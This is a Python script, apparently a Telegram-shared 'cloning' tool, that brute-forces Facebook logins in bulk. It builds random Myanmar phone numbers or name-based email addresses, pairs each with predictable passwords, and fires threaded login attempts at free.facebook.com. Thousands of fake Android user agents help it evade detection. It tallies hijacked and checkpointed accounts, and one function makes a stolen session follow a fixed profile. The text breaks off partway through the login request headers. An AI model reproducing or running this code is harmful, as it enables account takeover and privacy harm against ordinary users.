#======[ SEND : KALYAN KING ]
#======== { TG : OX CYBER TEAM }

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
a1 = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

def linex():
	print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
cps = []
oks = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    os.system("xdg-open https://t.me/+LRlET_sIrUcxMTk1 ")
    os.system("xdg-open https://t.me/+LRlET_sIrUcxMTk1 ")
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen1=[]
ugen2=[]
ugen3=[]
for agent in range(10000):
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    c = str(random.randint(180610, 231105))
    #d = str(random.randint(1, 9))
    #e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera/"])
    g = str(random.randint(104, 119))
    h = str(random.randint(422, 445))
    i = str(random.randint(22, 36))
    j = random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    user_agent = 'Dalvik/2.1.0 (Linux; U; Android '+a+'.0.0; '+b+' Build/'+j+'.'+c+') [FBAN/FB4A;FBAV/'+h+'.0.0.'+i+'.'+g+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+b+';FBBD/'+b+';FBDV/'+b+';FBSV/'+b+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(h)+',height='+str(g)+'};]'
    ugen1.append(user_agent)

for agent in range(10000):
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    c = str(random.randint(180610, 231105))
    d = str(random.randint(1, 9))
    e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera/"])
    g = str(random.randint(1111, 9999))
    h = str(random.randint(111, 999))
    i = str(random.randint(1, 9))
    j = random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    uge = 'Mozilla/5.0 (Linux; U; Android '+a+'.0; en; '+b+' Build/'+j+'.'+c+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+e+'.0.'+g+'.'+h+' '+f+''+a+'.'+a+'.0.'+g+' '+f+''+c+'.'+e+'.'+c+'.'+h+' Mobile Safari/537.36 '
    ugen2.append(uge)
    
for agent in range(10000):
    a="Mozilla/5.0 (Linux; Android "
    b=random.choice(["6.0;","7.0;","8.0;","9.0;","10.0;","11.0;","12.0;","13.0;"])
    c=" Nokia C"
    d=str(random.randint(10,110))
    e=" Build/"
    f=random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    g=str(random.randint(180610, 231105))
    h=".0"
    i=str(random.randint(14,16))
    j="; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
    k=str(random.randint(108,118))
    l=".0."
    m=str(random.randint(1,5359))
    n="."
    o=str(random.randint(1,128))
    p=" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]"
    ugen = a+b+c+d+e+f+g+h+i+j+k+l+m+n+o+p
    ugen3.append(ugen)
    
for ix in range(200):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen3.append(uaku)
def main():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mMETHOD \033[1;91m(1)")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mMETHOD \033[1;91m(2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mMETHOD \033[1;91m(3)")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    M = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if M in ["1"]:
        M1()
    if M in ["2"]:
        M2()
    if M in ["3"]:
        M3()
    if M in ["0"]:
        os.system('exit')    
    

def M1():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING ")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    K = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if K in ["1"]:
        K1()
    if K in ["2"]:
        K2()
    if K in ["3"]:
        K3()
    if K in ["4"]:
        K4()
    if K in ["5"]:
        K5()
    if K in ["0"]:
        os.system('exit')
        
def K1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def K2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx= [digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     


def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen1)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
